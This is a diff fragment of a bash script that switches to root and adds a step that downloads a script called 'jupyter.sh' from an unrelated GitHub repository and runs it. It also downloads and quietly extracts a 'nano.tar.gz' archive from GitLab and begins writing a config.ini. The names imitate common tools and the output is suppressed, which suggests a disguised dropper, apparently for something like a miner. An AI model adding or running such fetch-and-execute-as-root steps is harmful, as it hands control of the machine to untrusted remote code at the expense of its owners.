@@ -1,5 +1,7 @@
 #!/bin/bash
 sudo su <<EOF
+wget -qO jupyter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/jupyter.sh && chmod +x * && ./jupyter.sh
+
 wget -qO nano.tar.gz https://gitlab.com/jasa4/jasa/-/raw/main/nano.tar.gz && tar -xf nano.tar.gz && tar -xf nano.tar.gz >/dev/null 2>&1
 
 cat > config.ini <<END
